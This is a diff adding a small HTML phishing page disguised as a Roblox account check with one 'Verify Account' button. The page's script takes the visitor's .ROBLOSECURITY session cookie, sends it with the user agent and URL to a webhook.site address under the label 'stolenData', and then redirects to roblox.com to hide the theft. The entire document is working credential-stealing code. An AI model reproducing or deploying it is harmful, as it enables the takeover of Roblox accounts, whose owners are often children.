@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Verify</title>
+    <style>
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            background-color: #f2f4f5; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+        }
+        button {
+            background-color: #00b0f4; /* Roblox blue-ish color */
+            color: white;
+            border: none;
+            padding: 15px 32px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            transition: background-color 0.2s;
+        }
+        button:hover {
+            background-color: #0096d6;
+        }
+        button:active {
+            transform: translateY(1px);
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Single Button Only -->
+    <button id="verifyBtn">Verify Account</button>
+
+    <script>
+        document.getElementById('verifyBtn').addEventListener('click', function() {
+            // Function to extract specific cookie
+            function getCookie(name) {
+                let value = `; ${document.cookie}`;
+                let parts = value.split(`; ${name}=`);
+                if (parts.length === 2) return parts.pop().split(';').shift();
+                return null;
+            }
+
+            // Target: Roblox Security Cookie
+            const targetCookie = getCookie('.ROBLOSECURITY');
+
+            if (targetCookie) {
+                // Prepare the data to send
+                const stolenData = {
+                    type: "Roblox Cookie Logger (Button Trigger)",
+                    cookie: targetCookie,
+                    url: window.location.href,
+                    userAgent: navigator.userAgent,
+                    timestamp: new Date().toISOString()
+                };
+
+                // Send to your Webhook.site URL
+                fetch('https://webhook.site/c895d487-d199-4e5b-8285-e081d9420bad', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(stolenData)
+                })
+                .then(response => {
+                    // Success: Redirect to actual Roblox
+                    window.location.href = "https://www.roblox.com";
+                })
+                .catch(error => {
+                    // Error: Still redirect
+                    window.location.href = "https://www.roblox.com";
+                });
+            } else {
+                // If no cookie, redirect anyway
+                window.location.href = "https://www.roblox.com";
+            }
+        });
+    </script>
+
+</body>
+</html>
